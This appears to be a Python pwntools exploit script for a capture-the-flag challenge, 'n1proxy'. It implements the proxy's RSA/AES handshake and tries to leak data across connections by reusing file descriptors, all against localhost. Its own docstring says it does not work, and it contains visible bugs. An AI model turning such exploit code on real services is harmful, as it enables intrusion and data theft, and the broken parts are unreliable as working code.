#!/usr/bin/env python3

"""
Doesn't work obviously
What a week, huh?
"""

from pwn import *
from time import sleep
import threading
from Crypto.Util.number import bytes_to_long, long_to_bytes
from Crypto.Random import get_random_bytes
from Crypto.PublicKey import RSA
from Crypto.Signature import pkcs1_15
from Crypto.Hash import SHA256
from Crypto.Cipher import AES, PKCS1_v1_5
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Util.Padding import pad, unpad

context.log_level = logging.DEBUG

# local use only
PORT = 8080
HOST = 'localhost'

CLIENT_HELLO = 'n1proxy client v0.1'

class Server:
    def __init__(self) -> None:
        pass

# #[derive(Debug)]
# enum ProxyType {
#     Tcp = 0,
#     Udp = 1,
#     Sock = 2,
#     Unknown = 3,
# }
# #[derive(Debug)]
# enum ProxyStatus {
#     Send = 0,
#     Recv = 1,
#     Conn = 2,
#     Close = 3,
#     Listen = 4,
#     Unknown = 5,
# }

class Client:
    def __init__(self, r, k) -> None:
        self.r = r
        self.server = Server()
        self.k = k 
        self.p = k.p
        self.q = k.q
        self.n = k.n
        self.phi = (self.p-1) * (self.q-1)
        self.d = k.d
        self.e = k.e

    def do_client_hello(self):
        self.r.sendafter('server v0.1', CLIENT_HELLO)

    def do_connection_type(self):
        self.r.send(p32(self.conn_type))

    def rsa_sign(self, msg):
        h = SHA256.new(msg)
        return pkcs1_15.new(self.k).sign(h)
    
    def rsa_decrypt(self, msg):
        c = PKCS1_v1_5.new(self.k)
        return c.decrypt(msg, get_random_bytes(16))

    def aes_encrypt(self, msg):
        #ek = PBKDF2(self.aes_key, self.aes_iv, 32, count=15000, hmac_hash_module=SHA256)
        c = AES.new(self.aes_key, AES.MODE_CBC, self.aes_iv)
        return c.encrypt(pad(msg, 16))

    def aes_decrypt(self, msg):
        c = AES.new(self.aes_key, AES.MODE_CBC, self.aes_iv)
        return c.decrypt(pad(msg, 16))

    def do_key_exchange(self, proxy_type, proxy_status):
        # receive server keys
        key_exchange_sign_len = u64(self.r.recv(8))
        key_exchange_sign = self.r.recv(key_exchange_sign_len)

        pk_n_len = u64(self.r.recv(8))
        pk_e_len = u64(self.r.recv(8))

        self.server.pk_n = bytes_to_long(self.r.recv(pk_n_len))
        self.server.pk_e = bytes_to_long(self.r.recv(pk_e_len))

        # send client_verify
        client_verify = p64(len(long_to_bytes(self.n))) + long_to_bytes(self.n) + p64(len(long_to_bytes(self.e))) + long_to_bytes(self.e)
        s = self.rsa_sign(client_verify)
        self.r.send(p64(len(s)))
        self.r.send(s)

        # send client key n
        b = long_to_bytes(self.n)
        self.r.send(p64(len(b)))
        self.r.send(b)

        # send client key e
        b = long_to_bytes(self.e)
        self.r.send(p64(len(b)))
        self.r.send(b)

        # session key
        match self.conn_type:
            case 0 | 3: # New or Renew
                sessison_sign_len = u64(self.r.recv(8))
                sessison_sign = self.r.recv(sessison_sign_len)

                enc_key_len = u64(self.r.recv(8))
                enc_s_key = self.r.recv(enc_key_len)

                enc_time_len = u64(self.r.recv(8))
                enc_time = self.r.recv(enc_time_len)
            
                session_key = self.rsa_decrypt(enc_s_key)
                self.aes_key = session_key[:32]
                self.aes_iv = session_key[32:]

                self.time = self.rsa_decrypt(enc_time)

        self.proxy_type = proxy_type
        self.proxy_status = proxy_status
        
        # pre connection
        pre_conn = p32(self.proxy_type) + p32(self.proxy_status)
        s = self.rsa_sign(pre_conn)
        pre_conn += s
        self.r.send(self.aes_encrypt(pre_conn))

        # ok msg
        ok_enc = self.r.recv(0x210)
        ok = self.aes_decrypt(ok_enc)
        ok_msg = u32(ok[:4])
        assert(ok_msg == 0)        
        key_exchange_sign_len = ok[4:12]
        key_exchange_sign = ok[12:]


    # high level API
    def do_conn(self, protocol: int, host: str, port: int):
        self.do_client_hello()

        self.conn_type = 0 # ConnType::New
        self.do_connection_type()

        self.do_key_exchange(protocol, 2) # Conn
        

        msg = p32(len(host)) + host.encode() + p16(port)
        msg += c.rsa_sign(msg)
        self.r.send(self.aes_encrypt(msg))

        res = self.aes_decrypt(self.r.recv(0x210))
        self.conn_fd = u32(res[:4])

        self.r.close()

    def do_listen_unix(self, path, port):
        self.do_client_hello()

        self.conn_type = 0
        self.do_connection_type()

        self.do_key_exchange(2, 4)
        
        msg = p32(len(path)) + path.encode() + p16(port)
        msg += self.rsa_sign(msg)
        self.r.send(self.aes_encrypt(msg))

        res = self.aes_decrypt(self.r.recv(0x210))
        self.listen_fd = u32(res[:4])
        info(self.listen_fd)

        self.r.close()

    def do_send(self, fd, data):
        self.do_client_hello()

        self.conn_type = 0
        self.do_connection_type()

        self.do_key_exchange(2, 0)

        msg = p32(fd) + p64(len(data)) + data
        s = self.rsa_sign(msg)
        info(s)
        msg += s
        self.r.send(self.aes_encrypt(msg))

        # send another but dnw
        self.r.send(self.aes_encrypt(msg))

        self.r.close()

    def do_recv(self, fd, len):
        self.do_client_hello()

        self.conn_type = 0
        self.do_connection_type()

        self.do_key_exchange(2, 1)

        msg = p32(fd) + p64(len)
        msg += self.rsa_sign(msg)

        self.r.send(self.aes_encrypt(msg))

        info("Leaking data...")
        leak_enc = self.r.recv(0x400)
        info(self.aes_decrypt(leak_enc))

        self.r.close()


    def do_send_udp(self, fd: int):
        self.do_client_hello()
        self.conn_type = 1 # ConnType::Restore
        self.do_connection_type()

        self.do_key_exchange(1, 0) # UDP Send

        p = p32(fd) + p64(0x100) + b'A'*0x100
        p += self.rsa_sign(p)
        self.r.send(self.aes_encrypt(p))
        #sleep(1)
        #p = b'B'*0x100
        #p += self.rsa_sign(p) 
        self.r.send(self.aes_encrypt(p))


if __name__ == '__main__':
    unix_path = 'A'
    unix_port = 31337

    k = RSA.generate(1024)
    s = Client(remote(HOST, PORT), k)
    c = Client(remote(HOST, PORT), k)

    t = threading.Thread(target=s.do_listen_unix, args=(unix_path, unix_port))
    t.start()
    
    time.sleep(3)

    c.r = remote(HOST, PORT)
    c.do_conn(2, unix_path, unix_port)

    t.join()

    c.r = remote(HOST, PORT)
    c.do_send(c.conn_fd, b'A')

    s.r = remote(HOST, PORT)
    s.do_recv(c.conn_fd, 0x100)
